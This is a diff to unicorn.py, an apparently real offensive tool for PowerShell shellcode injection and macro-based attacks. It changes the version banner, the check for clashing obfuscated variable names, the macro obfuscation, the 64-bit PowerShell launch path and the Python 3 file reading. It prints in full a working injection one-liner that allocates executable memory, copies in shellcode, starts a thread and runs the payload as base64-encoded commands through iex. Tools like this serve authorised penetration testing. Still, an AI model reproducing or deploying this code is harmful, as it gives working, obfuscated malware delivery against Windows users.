@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.3.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.4 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -663,7 +663,7 @@ def generate_macro(full_attack, line_length=780):
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
     macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
-    macro_str = macro_str.replace('/w 1', "") # no longer needed
+    #macro_str = macro_str.replace('/w 1', "") # no longer needed
     macro_str = macro_str.replace("')", "')\"\"")
 
     # obfsucate the hell out of Shell and PowerShell
@@ -879,51 +879,51 @@ def gen_shellcode_attack(payload, ipaddr, port):
         var1 = "$" + generate_random_string(2, 2) # $1
         varcheck = var1
         var2 = "$" + generate_random_string(2, 2) # $c
-        if var2 in varcheck:
+        if var2.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var2
         var3 = "$" + generate_random_string(2, 2) # $2 - powershell
-        if var3 in varcheck:
+        if var3.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var3
         var4 = "$" + generate_random_string(2, 2) # $3
-        if var4 in varcheck:
+        if var4.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var4
         var5 = "$" + generate_random_string(2, 2) # $x
-        if var5 in varcheck:
+        if var5.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var5
         var6 = "$" + generate_random_string(2, 2) # $t
-        if var6 in varcheck:
+        if var6.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var6
         var7 = "$" + generate_random_string(2, 2) # $h
-        if var7 in varcheck:
+        if var7.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var7
         var8 = "$" + generate_random_string(2, 2) # $z
-        if var8 in varcheck:
+        if var8.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var8
         var9 = "$" + generate_random_string(2, 2) # $g
-        if var9 in varcheck:
+        if var9.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var9
         var10 = "$" + generate_random_string(2, 2) # $i
-        if var10 in varcheck:
+        if var10.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var10
         var11 = "$" + generate_random_string(2, 2) # $w
-        if var11 in varcheck:
+        if var11.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var11
         var12 = (str(generate_random_number(1001,1010)))
-        if var12 in varcheck:
+        if var12.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var12
         var13 = "$" + generate_random_string(2, 2) # $4 - Windows
-        if var13 in varcheck:
+        if var13.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var13
 
@@ -947,7 +947,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$3333="C:\$4444\syswow64\$4444$2222\v1.0\$2222";iex "& $3333 -e''c $hhhh"}''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -e''c $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
@@ -1225,7 +1225,7 @@ try:
         if not os.path.isfile(sys.argv[1]): 
             print("[!] File not found. Check the path and try again.")
             sys.exit()
-        payload = file(sys.argv[1], "r").read()
+        payload = open(sys.argv[1], "r").read()
 
         if attack_type == "cs":
             #if not "char buf[] =" in payload:
